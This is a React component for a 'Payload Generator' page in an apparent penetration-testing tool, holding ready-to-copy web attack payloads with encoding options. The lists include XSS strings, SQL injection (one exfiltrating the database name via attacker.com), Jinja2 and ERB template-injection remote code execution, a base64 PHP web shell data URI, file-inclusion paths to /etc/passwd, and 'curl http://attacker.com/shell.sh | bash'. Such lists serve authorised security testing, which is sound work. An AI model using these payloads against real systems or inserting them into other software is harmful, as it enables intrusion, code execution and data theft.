'use client';

import { useState } from 'react';
import { Copy, Shield, Code, Terminal } from 'lucide-react';
import { copyToClipboard } from '@/lib/utils';

const PAYLOADS = {
  xss: [
    { name: 'Basic Alert', payload: '<script>alert(1)</script>' },
    { name: 'Image OnError', payload: '<img src=x onerror=alert(1)>' },
    { name: 'SVG OnLoad', payload: '<svg onload=alert(1)>' },
    { name: 'JavaScript Protocol', payload: '<a href="javascript:alert(1)">Click</a>' },
    { name: 'Polyglot', payload: 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e' },
    { name: 'Angular SSTI', payload: '{{constructor.constructor(\'alert(1)\')()}}' },
    { name: 'Template Literal', payload: '${alert(1)}' },
  ],
  sqli: [
    { name: 'Classic OR', payload: "' OR '1'='1" },
    { name: 'Classic AND', payload: "' AND 1=1 --" },
    { name: 'Union Based', payload: "' UNION SELECT null, null, null --" },
    { name: 'Error Based', payload: "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT version()), FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --" },
    { name: 'Time Based (MySQL)', payload: "' AND SLEEP(5) --" },
    { name: 'Time Based (PostgreSQL)', payload: "' AND pg_sleep(5) --" },
    { name: 'Out of Band (MySQL)', payload: "' AND LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.attacker.com\\\\a')) --" },
  ],
  ssti: [
    { name: 'Jinja2 Basic', payload: '{{7*7}}' },
    { name: 'Jinja2 RCE', payload: "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}" },
    { name: 'Twig', payload: '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}' },
    { name: 'ERB (Ruby)', payload: '<%= system("id") %>' },
  ],
  command: [
    { name: 'Basic Concat', payload: '; id #' },
    { name: 'Pipe', payload: '| id #' },
    { name: 'Backtick', payload: '`id`' },
    { name: 'Command Substitution', payload: '$(id)' },
    { name: 'Newline', payload: '\n id \n' },
    { name: 'Curl Reverse Shell', payload: 'curl http://attacker.com/shell.sh | bash' },
  ],
  lfi: [
    { name: 'Basic', payload: '../../../etc/passwd' },
    { name: 'Null Byte (Legacy)', payload: '../../../etc/passwd%00' },
    { name: 'PHP Filter', payload: 'php://filter/convert.base64-encode/resource=index.php' },
    { name: 'Data URI', payload: 'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+' },
    { name: 'Expect', payload: 'expect://id' },
  ]
};

export default function PayloadGenerator() {
  const [category, setCategory] = useState<keyof typeof PAYLOADS>('xss');
  const [context, setContext] = useState('html');
  const [customPayload, setCustomPayload] = useState('');

  const getEncodedPayload = (payload: string) => {
    if (context === 'html') return payload;
    if (context === 'url') return encodeURIComponent(payload);
    if (context === 'base64') return btoa(payload);
    if (context === 'hex') return Array.from(payload).map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
    if (context === 'unicode') return Array.from(payload).map(c => '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0')).join('');
    return payload;
  };

  return (
    <div className="space-y-6">
      <div>
        <h1 className="text-2xl font-bold text-white mb-2">Payload Generator</h1>
        <p className="text-gray-400">Generate context-aware payloads for vulnerability testing. <span className="text-cyber-danger">Use only on systems you own or have explicit permission to test.</span></p>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        <div className="cyber-panel p-6">
          <h3 className="text-sm font-semibold text-cyber-primary mb-4 flex items-center gap-2">
            <Code className="w-4 h-4" /> Category
          </h3>
          <div className="space-y-2">
            {Object.keys(PAYLOADS).map((cat) => (
              <button
                key={cat}
                onClick={() => setCategory(cat as keyof typeof PAYLOADS)}
                className={`w-full text-left px-4 py-3 rounded font-mono text-sm transition-colors ${
                  category === cat 
                    ? 'bg-cyber-primary/20 text-cyber-primary border border-cyber-primary/50' 
                    : 'bg-cyber-black text-gray-400 hover:bg-cyber-border'
                }`}
              >
                {cat.toUpperCase()}
              </button>
            ))}
          </div>

          <div className="mt-6">
            <h3 className="text-sm font-semibold text-cyber-primary mb-4 flex items-center gap-2">
              <Terminal className="w-4 h-4" /> Encoding Context
            </h3>
            <select 
              value={context} 
              onChange={(e) => setContext(e.target.value)}
              className="cyber-input"
            >
              <option value="html">Raw / HTML</option>
              <option value="url">URL Encoded</option>
              <option value="base64">Base64</option>
              <option value="hex">Hex</option>
              <option value="unicode">Unicode Escaped</option>
            </select>
          </div>
        </div>

        <div className="lg:col-span-2 cyber-panel p-6">
          <h3 className="text-sm font-semibold text-cyber-primary mb-4">Generated Payloads</h3>
          <div className="space-y-3">
            {PAYLOADS[category].map((item, idx) => {
              const encoded = getEncodedPayload(item.payload);
              return (
                <div key={idx} className="bg-cyber-black border border-cyber-border rounded p-3 group hover:border-cyber-primary/50 transition-colors">
                  <div className="flex justify-between items-start mb-2">
                    <span className="text-xs font-semibold text-gray-400 uppercase tracking-wider">{item.name}</span>
                    <button 
                      onClick={() => copyToClipboard(encoded)}
                      className="opacity-0 group-hover:opacity-100 p-1.5 hover:bg-cyber-border rounded transition-all"
                      title="Copy to clipboard"
                    >
                      <Copy className="w-4 h-4 text-cyber-primary" />
                    </button>
                  </div>
                  <code className="block font-mono text-sm text-cyber-secondary break-all">{encoded}</code>
                </div>
              );
            })}
          </div>

          <div className="mt-6 pt-6 border-t border-cyber-border">
            <h3 className="text-sm font-semibold text-cyber-primary mb-4">Custom Payload Encoder</h3>
            <textarea
              value={customPayload}
              onChange={(e) => setCustomPayload(e.target.value)}
              placeholder="Enter custom payload to encode..."
              className="cyber-input h-24 font-mono text-xs resize-none mb-3"
            />
            {customPayload && (
              <div className="bg-cyber-black border border-cyber-border rounded p-3">
                <div className="flex justify-between items-center mb-2">
                  <span className="text-xs font-semibold text-gray-400 uppercase">Encoded Output</span>
                  <button 
                    onClick={() => copyToClipboard(getEncodedPayload(customPayload))}
                    className="p-1.5 hover:bg-cyber-border rounded"
                  >
                    <Copy className="w-4 h-4 text-cyber-primary" />
                  </button>
                </div>
                <code className="block font-mono text-sm text-cyber-primary break-all">{getEncodedPayload(customPayload)}</code>
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
}